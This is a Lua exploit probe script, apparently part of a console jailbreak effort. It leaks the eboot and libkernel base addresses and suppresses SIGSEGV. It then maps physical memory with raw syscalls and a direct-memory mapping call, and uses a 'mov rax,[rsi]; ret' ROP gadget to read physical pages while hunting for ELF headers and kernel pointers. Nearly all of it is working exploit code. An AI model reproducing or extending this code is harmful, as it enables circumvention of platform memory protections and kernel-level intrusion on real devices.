-- CRASH_CLASS: MODERATE
-- PROBE 562j: Read MapDM'd physical memory from MAIN thread
--
-- 562i proved: child thread + MapDM reads = "77" binary trace.
-- But child + heap reads = clean output.
-- The "77" comes from accessing MapDM'd phys pages in a child thread.
--
-- Alternative: read from MAIN thread using native.fcall_with_rax
-- to call `mov rax,[rsi]; ret` (eboot+0x1A5CC4) as a regular function.
-- rsi = mapped_va, returns rax = value at that address.
--
-- If this works: no child thread needed, clean text, game over.

print("=== PROBE 562j: MAIN THREAD PHYS READ ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function fmt(val)
    if val == nil then return "nil" end
    if type(val) == "table" and val.h then
        return string.format("0x%08X%08X", val.h, val.l)
    end
    return string.format("0x%X", N(val))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local Z = uint64(0)
local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)

-- eboot + libkernel
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(Z, ib) end)
local elo = rd(N(ib) + 0x108) or 0; local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eb=" .. fmt(eb))

wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local llo = rd(N(ib) + 0x108) or 0; local lhi = rd(N(ib) + 0x10C) or 0
if llo < 0 then llo = llo + 0x100000000 end
if lhi < 0 then lhi = lhi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lhi, llo))
local mapdm_fn = lk + uint64(0x15020)

local g_mov_rax_m = eb + uint64(0x1A5CC4)  -- mov rax,[rsi]; ret
print("read_gadget=" .. fmt(g_mov_rax_m))
io.flush()

-- ============================================================
-- [A] SIG_IGN for SIGSEGV (in case MapDM read faults)
-- ============================================================
print("")
print("[A] set SIG_IGN for SIGSEGV")
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, Z)
pcall(function() mk(416)(uint64(11), sa, Z) end)
print("done")
io.flush()

-- ============================================================
-- [B] Test: read heap memory via fcall_with_rax(mov_rax_mem_rsi)
-- ============================================================
print("")
print("[B] read heap via fcall (control)")
local test_data = memory.alloc(0x10)
wq(N(test_data), uint64("0xCAFEBABE12345678"))

-- native.fcall_with_rax(func, rax, rdi, rsi, rdx, rcx, r8, r9)
-- For mov rax,[rsi]; ret: we need rsi = address
-- rax = 0 (don't care), rdi = 0 (don't care), rsi = test_data
local ok_h, rv_h = pcall(function()
    return native.fcall_with_rax(g_mov_rax_m, 0, Z, uint64(N(test_data)))
end)
if ok_h then
    print("heap read: " .. fmt(rv_h))
    local hh, hl = get_hi_lo(rv_h)
    if hl == 0x12345678 and hh == 0xCAFEBABE then
        print("*** HEAP READ VIA FCALL: PERFECT MATCH ***")
    end
else
    print("heap read CRASHED")
end
io.flush()

-- ============================================================
-- [C] MapDM physical page
-- ============================================================
print("")
print("[C] MapDM phys 0x100000000")
local sc477 = mk(477)
local mapped_va = uint64("0x880000000")
pcall(function()
    sc477(mapped_va, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)
local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        mapped_va, uint64(0x4000), uint64(3), Z,
        uint64("0x100000000"), uint64(0x4000))
end)
local md_rv = ok_md and N(rv_md) or -999
print("MapDM rv=" .. md_rv)

if md_rv ~= 0 then
    print("MapDM FAILED")
    return
end
io.flush()

-- ============================================================
-- [D] THE TEST: read from MapDM'd page via fcall (main thread!)
-- ============================================================
print("")
print("[D] *** MAIN THREAD PHYS READ ***")
io.flush()

local ok_p, rv_p = pcall(function()
    return native.fcall_with_rax(g_mov_rax_m, 0, Z, mapped_va)
end)

if ok_p then
    local ph, pl = get_hi_lo(rv_p)
    print(string.format("phys[0x100000000]+0: 0x%08X_%08X", ph, pl))

    if pl == 0x464C457F then
        print("*** ELF HEADER FOUND AT 4GB! ***")
    end

    -- Read more qwords
    print("")
    print("Reading 16 qwords from phys 0x100000000:")
    for qi = 0, 15 do
        local ok_q, rv_q = pcall(function()
            return native.fcall_with_rax(g_mov_rax_m, 0, Z,
                mapped_va + uint64(qi * 8))
        end)
        if ok_q then
            local qh, ql = get_hi_lo(rv_q)
            local tag = ""
            if qi == 0 and ql == 0x464C457F then tag = " *** ELF! ***" end
            if qh >= 0xFFFF8000 and qh < 0xFFFFFFFF then tag = tag .. " KPTR?" end
            print(string.format("  [+%02X] 0x%08X_%08X%s", qi*8, qh, ql, tag))
        else
            print(string.format("  [+%02X] FAULT", qi*8))
            break
        end
    end
else
    print("CRASHED — MapDM'd pages not readable from main thread")
    print("(need child thread approach with binary extraction)")
end

-- Cleanup
pcall(function() mk(73)(mapped_va, uint64(0x4000)) end)

io.flush()
print("")
local pid2 = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid2 .. (pid2 == pid_val and " ALIVE" or " DEAD"))
print("=== 562j DONE ===")
